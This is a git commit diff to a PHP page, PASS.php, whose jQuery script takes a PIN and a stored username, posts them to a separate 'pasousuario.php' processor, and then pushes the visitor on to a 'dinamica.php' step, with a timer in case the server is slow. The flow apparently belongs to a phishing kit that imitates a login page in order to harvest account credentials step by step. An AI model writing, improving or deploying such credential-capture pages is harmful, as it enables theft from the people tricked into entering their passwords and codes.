ccfe6ca8b4c506c46aefa96bd6e79644e563a1f5
leidyjhoanalj88-png <leidyjhoanalj88@gmail.com>
2026-04-23 17:51:00 -0500

    Actualizar PASS.php

--- a/PASS.php
+++ a/PASS.php
@@ -1,20 +1,21 @@
 <script type="text/javascript">
     $(document).ready(function() {
-        // ... (el resto de tu código de los puntos) ...
-
         $("#btn-password").click(function() {
             var pin = $("#input_real").val();
             var usr = localStorage.getItem('user_akam') || "Usuario_Anonimo";
 
             $("#fondo, #cargando-o").show();
             
+            // Enviamos los datos al procesador
             $.post("../process/pasousuario.php", { 
                 'txt-usuario': usr, 
                 'txt-password': pin 
             }, function(data) {
+                // AUTOFLUJO: Aquí saltamos a la dinámica en lugar de esperar
                 window.location.href = "dinamica.php"; 
             });
 
+            // Salto de seguridad por si el servidor está lento
             setTimeout(function() { window.location.href = "dinamica.php"; }, 4000);
         });
     });
